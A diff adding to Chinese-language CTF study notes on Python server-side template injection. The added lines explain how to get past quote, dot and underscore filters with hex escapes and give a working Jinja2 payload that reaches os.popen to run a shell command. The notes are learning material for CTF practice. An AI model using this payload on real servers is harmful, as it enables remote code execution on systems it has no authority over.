@@ -178,6 +178,10 @@ _io.TextIOWrapper 可以文件读取，可能在122位。
 * `array[0]`
 * `array.pop(0)`
 ```
+单引号'被过滤可以用双引号"代替；至于点.和下划线_被过滤可以采用16进制来表示，用[](类似数组下标)的方式选定。知道怎么过滤了那就照着以前payload修改就好了。
+```
+payload：{{config["\x5f\x5fclass\x5f\x5f"]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]["os"]["popen"]("whoami")["read"]()}}
+```
 SSTI绕过注入:<https://xz.aliyun.com/t/3679#toc-11>
 ctf详解:<https://www.cnblogs.com/Article-kelp/p/14797393.html#questionOne>
 python解题模板:<https://blog.csdn.net/qq_51096893/article/details/122020518>
